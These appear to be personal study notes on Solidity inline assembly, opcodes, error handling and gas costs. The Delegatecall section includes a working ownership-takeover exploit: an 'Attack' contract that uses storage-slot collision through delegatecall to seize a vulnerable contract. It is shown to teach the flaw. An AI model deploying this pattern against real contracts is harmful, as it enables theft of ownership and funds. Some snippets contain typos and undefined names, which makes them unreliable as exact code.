# Solidity





## Assembly

144 opcode

stack machine

PUSH POP LIFO (Last In, First Out)

Reverse Polish Notiation

```solidity
a + b // Infix
a b add // Reverse Polish Notation
```



### Why I use the Assembly In solidity

#### Gas Saving

The main advantage is the gas saving, for example: 

```solidity
contract Test {
	function addAssembly(uint x, uint y) public pure returns(uint) {
		assembly {
			let result := add(x, y)
			mstore(0x0, result)
			return (0x0, 32)
		}
	}
	
	function addSolidity(uint x, uint y) public pure returns(uint) {
		return x + y;
	}
}
```

```solidity
// addAssembly
execution cost 254 gas.

// addSolidity
execution cost 340 gas.
```



#### Enhancement

- Inline assembly allows you to read entire words(256 bits) from data typres like `string` and `bytes` in a single operation.
- Some operations aren't exposed in Solidity. For instance, the `sha3` opcode takes a bytes range in memory to hash, while the Solidity function of the same name takes a string. Thus, hashing part of a string would require costly string copying operations. With inline assembly, you can pass in a string and hash just the bit you care about.
- Some things are flat out impossible without inline assembly. Solidity doesn't support gettting return values from external functions that return variable length types like dynamic arrays, `bytes` or `string` , but if you know the length to expect, you can call them using inline assembly.

[Inline assembly benefits]: https://ethereum.stackexchange.com/questions/3157/what-are-some-examples-of-how-inline-assembly-benefits-smart-contract-developmen



### Assembly Type

- Inline Assembly: That you can use in Solidity.
- Standalone Assembly: Using without Solidity.



### Assembly Operation

declare variables

```solidity
assembly {
	let x := 7
	let y := add(x, 3)
	let z := add(keccak(0x0, 0x20), div(slength, 32))
	let n
}
```



for loop

```solidity
    function nativeLoop(uint n, uint value) external pure returns (uint) {
        for (uint i = 0; i < n; i++) {
            value = 2 * value;
        }
        return value;
    }

    function asmLoop(uint n, uint value) external pure returns (uint) {
        assembly {
            for {let i := 0} lt(i, n) {i := add(i, 1)} {
                value := mul(value, 2)
            }
            mstore(0x00, value)
            return(0x00, 0x20)
        }
    }
```

| n          |   1   |       2       |       3       |      10       |
| ---------- | :---: | :-----------: | :-----------: | :-----------: |
| native     | 21950 |     22164     |     22378     |     23876     |
| asm        | 21692 |     21755     |     21818     |     22259     |
| gas saving |  258  |      409      |      560      |     1617      |
|            |  258  | 258 + 1 * 151 | 258 + 2 * 151 | 258 + 9 * 151 |



while

```solidity
assembly {
	let x := 0
	let i := 0
	for {} lt(i, 0x100) {} {
		x := add(x, mload(i))
		i := add(i, 0x20)
	}
}
```



if

```solidity
assembly {
	if slt(x, 0) { x := sub(0, x)} // OK
	
	if eq(value, 0) revert(0, 0) // Error, there nedd be {...}
}
```



switch

```solidity
assembly {
	let x := 0
	switch calldataload(4)
	case 0 {
		x := calldataload(0x24)
	}
	default {
		x := calldataload(0x44)
	}
	sstore(0, div(x, 2))
}
```

switch limits: 

- Code block need {}.
- Case must has the same type but not same value. 
- If the branch condition already covers all possible values, the default condition is not allowed to reappear.

```solidity
assembly {
	let x := 43
	switch lt(x, 30)
	case true {
		// ...
	}
	case false {
		// ...
	}
	default {} // Error
}
```



function

Allocate memory of specified length and return memory pointer pos.

```solidity
assembly {
	function allocate(length) -> pos {
		pos := mload(0x40)
		mstore(0x40, add(length, pos))
	}
	let fee_memory_pointer := allocate(64)
}
```

==If there is `return` in assembly, that will stop all operations in current context not only the operations in assembly.==

You can use `leave` keyword in `function` of assembly to stop and return.



### Opcodes

[Solidity Opcodes]: https://docs.soliditylang.org/en/v0.6.2/yul.html?highlight=opcodes#evm-dialect



#### features

- Opcodes marked with `-` do not return a result and all others return exactly one value.
- Opcodes marked with `F` `H` `B` `C` or `I` are present since Frontier, HomeStead, Byzantium, Constantinople or Istanbul.
- ==`mem[a...b]` signifies the bytes of memory starting at position `a` up to but not including position `b` .==
- `storage[p]` signifies the storage contents at slot `p`.



#### additional functions

- `datasize(x)`
- `dataoffset(x)`
- `datacopy(t, f, l)`

`datasize(x)` and `dataoffset(x)` can only take string literals (the names of other objexts) as arguments and return the size and offset in the data area, respectively. For the EVM, the `datacopy` function is equivalent to `codecopy`.



### Advanced Assembly

#### tuple

```solidity
assembly {
	function f() -> a, b {}
	let c, d := f()
}
```



## Delegatecall

When call delegatecall function to udpate a storage variable, the modification of the variable is not based on the name of the variable, but on the storage location of the variable.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.4;

contract Lib {
    uint public number;

    function updateNumber(uint _num) external {
        number = _num;
    }
}

contract HackMe {
    address public lib;
    address public owner;
    uint public number;

    constructor(address _lib) public {
        lib = _lib;
        owner = msg.sender;
    }

    function updateNumber(uint _num) external {
        lib.delegatecall(abi.encodeWithSignature("updateNumber(uint256)", _num));
    }
}

contract Attack {
    address public lib;
    address public owner;
    uint public number;

    HackMe public hackMe;

    constructor(HackMe _hackMe) public {
        hackMe = HackMe(_hackMe);
    }

    function attack() external {
        hackMe.updateNumber(uint(uint160(address(this))));
        hackMe.updateNumber(1);
    }

    function updateNumber(uint _num) external {
        owner = tx.origin;
    }
}
```



## Libraries

[Deep Dive Into Solidity Libraries](https://coinsbench.com/deep-dive-into-solidity-libraries-e9bd7f9061fb)



## Error

### Error Handling

#### if throw

```solidity
contract HasAnOwner {
	address owner;
	function useSuperPowner() external {
		if (msg.sender != owner) { throw; } 
		// ...
	}
}
```

The function will throw returning an `invalid opcode` error when the caller address is not `owner`, ==undoing all state changes, and using up remaining gas.==

The throw keyword is now being deprecated.



#### assert, require, revert

old one:

```solidity
if (msg.sender != owner) { throw; }
```

new one:

```solidity
if (msg.sender != owner) { revert(); }
assert(msg.sender == owner);
require(msg.sender == owner);
```

`assert(false)` compiles to `0xfe` , which is an invalid opcode, using up all remains gas, and reverting all changes.

`require(false)` compiles to `0xfd` which is the `REVERT`  opcode, meaning it will refund the remaining gas. The opcode can also return a value.

`assert()` creates an ==error of type `Panic(uint256)`==, Assert should only be used to test for internal errors, and to check invariants. Properly functioning code should never create a Panic.

`require()` creates an error without any data or ==an error of type `Error(string)`.==



#### REVERT opcode

 `REVERT` will still undo all state changes.

- It will allow you to return a value.	
- It will refund any remaining gas to the caller.

```solidity
revert CustomError(agr1, arg2);
revert();
revert("description");
```

The error data will be passed back to the caller and can be caught there.

Using a custom error instance will usually be much cheaper than a string description , because you can use the name of the error to describe it , which is encoded in only four bytes.

```solidity
pragma solidity ^0.8.4;

contract VendingMachine {
	address owner;
	error Unauthorized();
	function withdraw() public {
		if (msg.sender != owner) revert Unauthorized();
	}
}
```



The Provider string is abi-encoded as if it were call to a function `Error(string)`. For example `revert("not enough Ether provided.");` returns the following hexadecimal as error return data:

```sh
0x08c379a0                                                         // Function selector for Error(string)
0x0000000000000000000000000000000000000000000000000000000000000020 // Data offset
0x000000000000000000000000000000000000000000000000000000000000001a // String length
0x4e6f7420656e6f7567682045746865722070726f76696465642e000000000000 // String data
```





## Gas

#### loop index type

```solidity
mapping(uint => uint16[]) index2arr;

// index type uint
function addToArr(uint _index, uint16[] memory _nums) external {
    for (uint i = 0; i < _nums.length; i++) {
        index2arr[_index].push(_nums[i]);
    }
}

// index type uint16
function addToArr(uint _index, uint16[] memory _nums) external {
		require(_nums.length < type(uint16).max, 'Length overflow.');
    for (uint16 i = 0; i < _nums.length; i++) {
        index2arr[_index].push(_nums[i]);
    }
}
```

Run test to add 100 nums into the array, result:

```sh
# index type uint
======gas used: 315642
======gas fee: 6.9441239999999995U
✔ gas for nums length 100 (2053ms)

# index type uint16
======gas used: 319425
======gas fee: 7.02735U
✔ gas for nums length 100 (2115ms)
```

Using `uint` is more gas saving.



## Test

[race-14-of-the-secureum-bootcamp-epoch-infinity](https://ventral.digital/posts/2023/1/30/race-14-of-the-secureum-bootcamp-epoch-infinity)

